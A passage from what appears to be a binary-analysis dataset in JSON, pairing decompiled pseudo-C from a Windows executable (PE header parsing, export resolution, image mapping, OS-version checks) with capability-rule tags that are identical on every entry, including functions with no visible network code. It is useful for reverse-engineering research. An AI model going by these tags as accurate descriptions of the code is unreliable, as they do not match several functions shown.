fcn.00035330(var_10h);\n    fcn.0005a340(var_14h);\n    fcn.00035330(var_4h);\n    if (var_8h != -1) {\n        fcn.00035b40(var_8h);\n    }\n    return var_18h;\n}\n",
        "token_count": 1318
    },
    "0005c850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005c850(int32_t arg_8h, char *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint16_t uVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint var_48h;\n    uint var_40h;\n    char *var_3ch;\n    uint32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_30h = 0x21590066;\n    }\n    else if (arg_ch == NULL) {\n        var_30h = 0x21590067;\n    }\n    else if (arg_10h == NULL) {\n        var_30h = 0x21590068;\n    }\n    else {\n        iVar6 = arg_8h + *(arg_8h + 0x3c);\n        puVar9 = iVar6 + 0x78;\n        if (*puVar9 == 0) {\n            var_30h = 0x21590005;\n        }\n        else {\n            iVar10 = arg_8h + *puVar9;\n            iVar7 = arg_8h + *(iVar10 + 0x1c);\n            iVar11 = arg_8h + *(iVar10 + 0x20);\n            if ((arg_ch & 0xffff0000) == 0) {\n                uVar8 = arg_ch - *(iVar10 + 0x10);\n                if (uVar8 < *(iVar10 + 0x14) || uVar8 == *(iVar10 + 0x14)) {\n                    uVar3 = *(iVar7 + uVar8 * 4);\n                    if ((uVar3 < *puVar9) || (*puVar9 + *(iVar6 + 0x7c) <= uVar3)) {\n                        *arg_10h = arg_8h + uVar3;\n                        var_30h = 0;\n                    }\n                    else {\n                        var_30h = fcn.0005cab0(arg_8h + uVar3, arg_10h);\n                    }\n                }\n                else {\n                    var_30h = 0x21590005;\n                }\n            }\n            else {\n                var_3ch = arg_ch;\n                do {\n                    cVar1 = *var_3ch;\n                    var_3ch = var_3ch + 1;\n                } while (cVar1 != '\\0');\n                uVar3 = var_3ch - (arg_ch + 1);\n                var_30h = 0x21590005;\n                for (var_10h = 0; var_10h < *(iVar10 + 0x18); var_10h = var_10h + 1) {\n                    uVar2 = *(iVar7 + *(arg_8h + *(iVar10 + 0x24) + var_10h * 2) * 4);\n                    if ((uVar3 < (*puVar9 + *(iVar6 + 0x7c)) - *(iVar11 + var_10h * 4)) &&\n                       (iVar4 = arg_8h + *(iVar11 + var_10h * 4),  *(iVar4 + uVar3) == '\\0')) {\n                        for (var_38h = 0; (var_38h < uVar3 && (*(iVar4 + var_38h) == arg_ch[var_38h]));\n                            var_38h = var_38h + 1) {\n                        }\n                        if (uVar3 <= var_38h) {\n                            if ((*puVar9 <= uVar2) && (uVar2 < *puVar9 + *(iVar6 + 0x7c))) {\n                                uVar5 = fcn.0005cab0(arg_8h + uVar2, arg_10h);\n                                return uVar5;\n                            }\n                            *arg_10h = arg_8h + uVar2;\n                            return 0;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return var_30h;\n}\n",
        "token_count": 1034
    },
    "0005cab0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005cab0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_118h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = fcn.00034ec0(arg_8h, 0x2e);\n    if (var_ch == 0) {\n        var_10h = 0x2159000d;\n    }\n    else {\n        var_ch = var_ch + 1;\n        var_4h = var_ch - arg_8h;\n        if (var_4h < 0x104) {\n            fcn.00034e80(&var_118h, arg_8h, var_4h);\n            *(&var_118h + var_4h) = 0;\n            var_10h = fcn.00034a80(&var_118h, &var_8h);\n            if (var_10h == 0) {\n                var_10h = fcn.0005c850(var_8h, var_ch, arg_ch);\n            }\n        }\n        else {\n            var_10h = 0x2159000b;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 290
    },
    "0005cb50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005cb50(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        iVar1 = 0x21590067;\n    }\n    else if (arg_14h == 0) {\n        iVar1 = 0x21590068;\n    }\n    else {\n        iVar1 = fcn.00057ff0(arg_8h, arg_ch, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == 0) {\n                iVar1 = 0x21590005;\n            }\n            else {\n                iVar1 = fcn.0005c300(arg_8h, arg_ch, arg_10h, arg_14h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 248
    },
    "0005cbd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005cbd0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    if (arg_ch == 0) {\n        return 0x21590066;\n    }\n    if (arg_10h != 0) {\n        var_10h = fcn.00035200(0x20a);\n        if (var_10h == 0) {\n            var_4h = 0x21590004;\n            goto code_r0x0005ccc6;\n        }\n        iVar1 = fcn.0007871e(var_10h, arg_10h, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590066;\n            goto code_r0x0005ccc6;\n        }\n        *(var_10h + iVar1 * 2) = 0;\n    }\n    if (arg_14h != 0) {\n        var_ch = fcn.00035200(0x20a);\n        if (var_ch == 0) {\n            var_4h = 0x21590004;\n            goto code_r0x0005ccc6;\n        }\n        iVar1 = fcn.0007871e(var_ch, arg_14h, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590066;\n            goto code_r0x0005ccc6;\n        }\n        *(var_ch + iVar1 * 2) = 0;\n    }\n    var_4h = fcn.0005ccf0(arg_8h, arg_ch, var_10h, var_ch, arg_18h);\ncode_r0x0005ccc6:\n    fcn.00035330(var_ch);\n    fcn.00035330(var_10h);\n    return var_4h;\n}\n",
        "token_count": 485
    },
    "0005ccf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005ccf0(int32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4, uint32_t *param_5)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    uint32_t var_ch;\n    int32_t var_10h_2;\n    int32_t var_14h;\n    uint32_t *var_18h_2;\n    uint var_18h;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t var_64h;\n    int32_t var_5ch;\n    uint32_t *var_58h;\n    char var_52h;\n    char var_51h;\n    int16_t *var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0xb1c45950;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0005ccf0::var_10h;\n    *0x10 = &stack0xffffff8c;\n    var_4ch = 0;\n    var_50h = NULL;\n    var_58h = NULL;\n    var_20h = 0;\n    var_5ch = 0;\n    bVar2 = false;\n    var_51h = '\\0';\n    var_44h = 0;\n    var_40h = 0;\n    var_19h._0_1_ = '\\0';\n    if (var_ch == 0) {\n        var_64h = 0x21590066;\n        goto code_r0x0005d23c;\n    }\n    var_4h = 0;\n    var_64h = fcn.0005a2c0(&fcn.0005ccf0::var_5ch, 0x438, var_8h);\n    if ((var_64h == 0) && (var_64h = fcn.0005bb80(var_ch, 0),  var_64h == 0)) {\n        var_4ch = var_ch + *(var_ch + 0x3c);\n        var_50h = var_4ch + 0x18;\n        if (((*(var_4ch + 0x5c) == 1) && (var_8h != 0)) || ((*(var_4ch + 0x5c) != 1 && (var_8h == 0)))) {\n            var_64h = 0x21590206;\n        }\n        else {\n            var_64h = fcn.0005a030(var_5ch, &stack0xffffffaa);\n            if (var_64h == 0) {\n                if (var_52h == '\\0') {\n                    var_64h = 0x21590206;\n                }\n                else if (((var_52h == '\\0') || (*var_50h != 0x20b)) && ((var_52h != '\\0' || (*var_50h != 0x10b)))) {\n                    uVar4 = var_ch;\n                    var_3ch = fcn.0005b8a0(var_ch);\n                    var_20h = fcn.00035200(var_3ch);\n                    if (var_20h == 0) {\n                        var_64h = 0x21590004;\n                    }\n                    else {\n                        fcn.00078790(var_20h, 0, var_3ch);\n                        var_64h = fcn.0005b980(var_20h, var_ch);\n                        if (var_64h == 0) {\n                            if (var_5ch != 0) {\n                                var_64h = (**0xb1bde2a4)(var_5ch, 0, 0, 0, &fcn.0005ccf0::var_40h, 0);\n                                if (var_64h < 0) goto code_r0x0005d18b;\n                                iVar3 = (**0xb1bde1b8)();\n                                if (var_40h != iVar3) {\n                                    (**0xb1bde1bc)(var_40h, &fcn.0005ccf0::var_38h);\n                                    var_19h._0_1_ = '\\x01';\n                                }\n                            }\n                            var_4ch = var_20h + *(var_20h + 0x3c);\n                            var_50h = var_4ch + 0x18;\n                            var_44h = *(var_4ch + 0x34);\n                            var_64h = fcn.0005a1b0(var_5ch, &fcn.0005ccf0::var_44h, &fcn.0005ccf0::var_3ch);\n                            if (((var_64h == 0) && (var_64h = fcn.0005b270(var_20h, var_44h),  var_64h == 0)) &&\n                               (var_64h = fcn.0005a170(var_5ch, var_44h, 0, var_20h, var_3ch),  var_64h == 0)) {\n                                if (var_8h == 0) {\ncode_r0x0005d0d3:\n                                    var_64h = fcn.0005b480(var_8h, var_20h);\n                                    if (var_64h == 0) {\n                                        bVar2 = true;\n                                        uVar5 = 0x5d111;\n                                        var_64h = fcn.0005a170(var_5ch, var_44h, 0, var_20h, var_3ch);\n                                        if (var_64h == 0) {\n                                            if (*(var_4ch + 0x28) != 0) {\n                                                uVar5 = 1;\n                                                uVar4 = var_44h;\n                                                var_64h = fcn.0005af00(var_8h, var_44h + *(var_50h + 8), var_44h, 1);\n                                                if (var_64h != 0) goto code_r0x0005d18b;\n                                            }\n                                            fcn.00058cd0(var_8h, &fcn.0005ccf0::var_48h, uVar4, uVar5);\n                                            var_64h = 0;\n                                        }\n                                    }\n                                }\n                                else {\n                                    var_58h = fcn.00035200(0x428);\n                                    if (var_58h == NULL) {\n                                        var_64h = 0x21590004;\n                                    }\n                                    else {\n                                        *var_58h = var_44h;\n                                        var_58h[1] = 0;\n                                        uVar1 = *(var_50h + 8);\n                                        var_58h[4] = var_44h + uVar1;\n                                        var_58h[5] = CARRY4(var_44h, uVar1);\n                                        var_58h[2] = *(var_50h + 0x1c);\n                                        var_58h[3] = *(var_4ch + 8);\n                                        if (var_10h_2 == 0) {\n                                            *(var_58h + 6) = 0;\n                                        }\n                                        else {\n                                            fcn.00078592(var_58h + 6, var_10h_2, 0x104);\n                                            *(var_58h + 0x21e) = 0;\n                                        }\n                                        if (var_14h == 0) {\n                                            *(var_58h + 0x88) = 0;\n                                        }\n                                        else {\n                                            fcn.00078592(var_58h + 0x88, var_14h, 0x104);\n                                            *(var_58h + 0x426) = 0;\n                                        }\n                                        var_64h = fcn.000583c0();\n                                        if (var_64h == 0) {\n                                            var_51h = '\\x01';\n                                            goto code_r0x0005d0d3;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_64h = 0x21590206;\n                }\n            }\n        }\n    }\ncode_r0x0005d18b:\n    var_4h = 0xffffffff;\n    if (var_64h == 0) {\n        if (var_18h_2 != NULL) {\n            *var_18h_2 = var_44h;\n        }\n    }\n    else {\n        if (bVar2) {\n            fcn.0005d930(var_8h, var_44h, 0);\n        }\n        else if (var_44h != 0) {\n            if (var_51h != '\\0') {\n                fcn.00058ec0(var_8h, var_44h);\n            }\n            fcn.0005a280(var_5ch, var_44h);\n        }\n        if (var_18h_2 != NULL) {\n            *var_18h_2 = 0;\n        }\n    }\n    if (var_5ch != 0) {\n        fcn.00078544(var_5ch);\n    }\n    fcn.00035330(var_20h);\n    fcn.00035330(var_58h);\n    if (var_40h != 0) {\n        if (var_19h != '\\0') {\n            (**0xb1bde1b4)(&fcn.0005ccf0::var_38h);\n        }\n        (**0xb1bde2e4)();\n    }\ncode_r0x0005d23c:\n    *in_FS_OFFSET = var_10h;\n    return var_64h;\n}\n",
        "token_count": 2305
    },
    "0005d250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005d250(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        var_4h = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        var_4h = 0x21590067;\n    }\n    else {\n        arg_ch_00 = fcn.00035200(0x20a);\n        if (arg_ch_00 == 0) {\n            var_4h = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.0007871e(arg_ch_00, arg_ch, 0x104);\n            if (iVar1 == -1) {\n                var_4h = 0x21590066;\n            }\n            else {\n                *(arg_ch_00 + iVar1 * 2) = 0;\n                var_4h = fcn.0005d300(arg_8h, arg_ch_00, arg_10h);\n            }\n            fcn.00035330(arg_ch_00);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 295
    },
    "0005d300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005d300(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_1ch;\n    code *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        var_14h = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        var_14h = 0x21590067;\n    }\n    else {\n        var_10h = arg_8h;\n        var_ch = arg_ch;\n        var_8h = arg_10h;\n        iVar1 = fcn.00034c90();\n        if ((iVar1 < 0x1b) || (uVar2 = fcn.000578a0(),  0x1fff < uVar2)) {\n            iVar1 = fcn.00034c90();\n            if ((iVar1 < 0x1b) && (uVar2 = fcn.000578a0(),  uVar2 < 0xc00)) {\n                var_14h = 0x21590004;\n            }\n            else {\n                fcn.0005d3f0(&var_10h);\n                var_14h = var_4h;\n            }\n        }\n        else {\n            var_14h = fcn.00034a80(0xb1bde81c, &var_1ch);\n            if ((var_14h == 0) &&\n               ((var_14h = fcn.0005c850(var_1ch, 0xb1be27ac, &var_18h),  var_14h == 0 &&\n                (iVar1 = (*var_18h)(0xb1c2a3f0, &var_10h, 0xe800, 1, 0),  var_14h = var_4h,  iVar1 != 0)))) {\n                var_14h = iVar1;\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 504
    },
    "0005d3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005d8e2)\n\nvoid __cdecl fcn.0005d3f0(uint *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint var_a4h;\n    uint var_9ch;\n    int16_t *var_98h;\n    uint var_94h;\n    uint var_8ch;\n    int16_t *var_88h;\n    uint var_84h;\n    uint var_7ch;\n    int16_t *var_78h;\n    uint *var_70h;\n    uint var_6ch;\n    uint var_64h;\n    int16_t *var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_4ch;\n    uint var_48h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int16_t *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    char var_11h;\n    int32_t var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_38h = 0;\n    var_30h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = NULL;\n    var_3ch = *arg_8h;\n    var_34h = arg_8h[1];\n    var_4ch = arg_8h[2];\n    if (var_34h != NULL) {\n        var_60h = var_34h;\n        do {\n            iVar1 = *var_60h;\n            var_60h = var_60h + 1;\n        } while (iVar1 != 0);\n        if (var_60h - (var_34h + 1) >> 1 != 0) {\n            if (var_4ch == NULL) {\n                arg_8h[3] = 0x21590067;\n                return;\n            }\n            *var_4ch = 0;\n            var_38h = fcn.00035200(0x212);\n            if (var_38h == 0) {\n                arg_8h[3] = 0x21590004;\n                return;\n            }\n            fcn.00078592(var_38h, var_34h, 0x104);\n            *(var_38h + 0x208) = 0;\n            iVar3 = fcn.0007859e(var_38h, 0x2e);\n            if ((iVar3 == 0) || (*(iVar3 + 2) == 0x5c)) {\n                puVar2 = var_38h + -2;\n                do {\n                    var_70h = puVar2;\n                    puVar2 = var_70h + 2;\n                } while (*(var_70h + 2) != 0);\n                *(var_70h + 2) = *0xb1be27cc;\n                *(var_70h + 6) = *0xb1be27d0;\n                *(var_70h + 10) = *0xb1be27d4;\n            }\n            var_4h = 0;\n            var_40h = fcn.0005df60(var_3ch, var_38h, 0x212, &var_4h);\n            if (var_40h == 0) {\n                var_5ch = fcn.0007859e(var_38h, 0x5c);\n                if (var_5ch == 0) {\n                    var_5ch = var_38h;\n                }\n                else {\n                    var_5ch = var_5ch + 2;\n                }\n                var_40h = fcn.00059020(var_3ch, var_5ch, var_4ch);\n                if (var_40h != 0) {\n                    fcn.00078550(&var_48h, var_38h);\n                    var_2ch = 0x18;\n                    var_28h = 0;\n                    var_20h = 0x240;\n                    var_24h = &var_48h;\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_40h = fcn.0001ec90(&var_30h, 0x80000000, &var_2ch, &var_54h, 0, 0, 7, 1, 0x40, 0, 0);\n                    if (var_40h != 0) {\n                        if (var_5ch != var_38h) goto code_r0x0005d8d0;\n                        var_8h = fcn.00035200(0x208);\n                        if (var_8h == NULL) {\n                            var_40h = 0x21590004;\n                            goto code_r0x0005d8d0;\n                        }\n                        var_40h = fcn.00034b10(var_8h, 0x104);\n                        if ((var_40h != 0) || (var_40h = fcn.00059fe0(0xffffffff, &var_11h),  var_40h != 0))\n                        goto code_r0x0005d8d0;\n                        if (var_11h == '\\0') {\n                            var_78h = var_8h;\n                            do {\n                                iVar1 = *var_78h;\n                                var_78h = var_78h + 1;\n                            } while (iVar1 != 0);\n                            fcn.000785e6(var_8h, 0xb1be277c, 0x104 - (var_78h - (var_8h + 1) >> 1));\n                        }\n                        else {\n                            var_88h = var_8h;\n                            do {\n                                iVar1 = *var_88h;\n                                var_88h = var_88h + 1;\n                            } while (iVar1 != 0);\n                            fcn.000785e6(var_8h, 0xb1be2794, 0x104 - (var_88h - (var_8h + 1) >> 1));\n                        }\n                        var_98h = var_8h;\n                        do {\n                            iVar1 = *var_98h;\n                            var_98h = var_98h + 1;\n                        } while (iVar1 != 0);\n                        fcn.000785e6(var_8h, var_38h, 0x104 - (var_98h - (var_8h + 1) >> 1));\n                        var_8h[0x103] = 0;\n                        fcn.00078550(&var_48h, var_8h);\n                        var_2ch = 0x18;\n                        var_28h = 0;\n                        var_20h = 0x240;\n                        var_24h = &var_48h;\n                        var_1ch = 0;\n                        var_18h = 0;\n                        var_40h = fcn.0001ec90(&var_30h, 0x80000000, &var_2ch, &var_54h, 0, 0, 7, 1, 0x40, 0, 0);\n                        if (var_40h != 0) goto code_r0x0005d8d0;\n                    }\n                    var_2ch = 0x18;\n                    var_28h = 0;\n                    var_20h = 0x200;\n                    var_24h = NULL;\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_40h = fcn.0007868e();\n                    if ((var_40h == 0) && (var_40h = fcn.0007867c(),  var_40h == 0)) {\n                        var_40h = fcn.0005ccf0();\n                    }\n                }\n            }\ncode_r0x0005d8d0:\n            fcn.00035330(var_8h);\n            if (var_10h != 0) {\n                fcn.00078544(var_10h);\n            }\n            if (var_30h != 0) {\n                fcn.00078544(var_30h);\n            }\n            fcn.00035330(var_38h);\n            arg_8h[3] = var_40h;\n            return;\n        }\n    }\n    arg_8h[3] = 0x21590066;\n    return;\n}\n",
        "token_count": 1990
    },
    "0005d930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005d930(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_1ch;\n    code *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    var_8h._0_1_ = arg_10h;\n    var_4h = -1;\n    iVar1 = fcn.00034c90();\n    if ((iVar1 < 0x1b) || (uVar2 = fcn.000578a0(),  0x1fff < uVar2)) {\n        iVar1 = fcn.00034c90();\n        if ((iVar1 < 0x1b) && (uVar2 = fcn.000578a0(),  uVar2 < 0xc00)) {\n            var_14h = 0x21590004;\n        }\n        else {\n            fcn.0005da00(&var_10h);\n            var_14h = var_4h;\n        }\n    }\n    else {\n        var_14h = fcn.00034a80(0xb1bde81c, &var_1ch);\n        if ((var_14h == 0) &&\n           ((var_14h = fcn.0005c850(var_1ch, 0xb1be27ac, &var_18h),  var_14h == 0 &&\n            (iVar1 = (*var_18h)(0xb1c2aa00, &var_10h, 0xe800, 1, 0),  var_14h = var_4h,  iVar1 != 0)))) {\n            var_14h = iVar1;\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 458
    },
    "0005da00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0005da00(int32_t *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    int32_t *var_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_160h;\n    uint32_t var_124h;\n    int32_t var_11ch;\n    uint32_t var_118h;\n    int32_t var_114h;\n    int32_t var_110h;\n    int32_t var_e8h;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0xb1c45980;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0005da00::var_10h;\n    puStack28 = &stack0xfffffe90;\n    var_114h = 0;\n    if (var_8h[1] == 0) {\n        var_11ch = 0x21590065;\n        puStack28 = &stack0xfffffe90;\n    }\n    else if (*var_8h == 0) {\n        var_11ch = 0;\n        puStack28 = &stack0xfffffe90;\n    }\n    else {\n        var_4h = 0;\n        iVar2 = var_8h[1];\n        var_11ch = fcn.00057ff0(*var_8h, iVar2, &fcn.0005da00::var_118h);\n        if (var_11ch == 0) {\n            if (var_118h == 0) {\n                var_11ch = 0;\n            }\n            else if (var_118h == 0xffffffff) {\n                var_11ch = 0;\n            }\n            else if ((var_118h == 0) || (var_11ch = fcn.00059780(*var_8h, var_8h[1]),  var_11ch == 0)) {\n                if (var_118h < 2) {\n                    var_11ch = fcn.0005a2c0(&fcn.0005da00::var_114h, 0x18, *var_8h);\n                    if ((var_11ch == 0) &&\n                       (var_11ch = fcn.0005a130(var_114h, var_8h[1], 0, &fcn.0005da00::var_160h, 0x40),  var_11ch == 0))\n                    {\n                        if (var_160h == 0x5a4d) {\n                            uVar1 = 0x5dbeb;\n                            var_11ch = fcn.0005a130(var_114h, var_8h[1] + var_124h, \n                                                    (var_124h >> 0x1f) + CARRY4(var_8h[1], var_124h), \n                                                    &fcn.0005da00::var_110h, 0xf8);\n                            if (var_11ch == 0) {\n                                if (var_110h == 0x4550) {\n                                    fcn.00078544(uVar1);\n                                    var_114h = 0;\n                                    if ((((*(var_8h + 2) == '\\0') || (var_e8h == 0)) ||\n                                        (var_11ch = fcn.0005af00(*var_8h, var_8h[1] + var_e8h, var_8h[1], 0), \n                                        var_11ch == 0)) && (var_11ch = fcn.00058ec0(iVar2, var_8h[1]),  var_11ch == 0))\n                                    {\n                                        var_11ch = fcn.0005dd30(*var_8h, &fcn.0005da00::var_110h, var_8h[1]);\n                                    }\n                                }\n                                else {\n                                    var_11ch = -1;\n                                }\n                            }\n                        }\n                        else {\n                            var_11ch = -1;\n                        }\n                    }\n                }\n                else {\n                    var_11ch = 0;\n                }\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_114h != 0) {\n        fcn.00078544(var_114h);\n    }\n    var_8h[3] = var_11ch;\n    *in_FS_OFFSET = var_10h;\n    return;\n}\n",
        "token_count": 1040
    },
    "0005dd30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005dd8e)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005dd30(uint param_1, int32_t param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    uint32_t var_10h;\n    int32_t var_14ch;\n    int32_t var_148h;\n    int32_t var_144h;\n    uint var_140h;\n    uint var_34h;\n    uint32_t var_28h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0xb1c45990;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xfffffea4;\n    var_144h = 0;\n    var_148h = 0;\n    var_4h = 0;\n    var_20h = var_10h + *(var_ch + 0x80);\n    if (var_20h == var_10h) {\n        var_14ch = 0;\n        puStack28 = &stack0xfffffea4;\n    }\n    else {\n        var_14ch = fcn.0005a2c0(&var_148h, 0x18, var_8h);\n        if (var_14ch == 0) {\n            while (var_14ch = fcn.0005a130(var_148h, var_20h, 0, &var_34h, 0x14),  var_14ch == 0) {\n                if (var_28h == 0) {\n                    fcn.0005a280(var_148h, var_10h);\n                    var_14ch = 0;\n                    break;\n                }\n                var_14ch = fcn.0005a130(var_148h, var_10h + var_28h, CARRY4(var_10h, var_28h), &var_140h, 0x104);\n                if (var_14ch != 0) break;\n                if (var_140h != '\\0') {\n                    if (var_144h != 0) {\n                        var_14ch = 0x2159000d;\n                        break;\n                    }\n                    iVar1 = fcn.00058fa0(var_8h, &var_140h, &var_1ch);\n                    if (iVar1 == 0) {\n                        fcn.00059780(var_8h, var_1ch);\n                        fcn.0005d930(var_8h, var_1ch, 1);\n                    }\n                    var_20h = var_20h + 0x14;\n                }\n            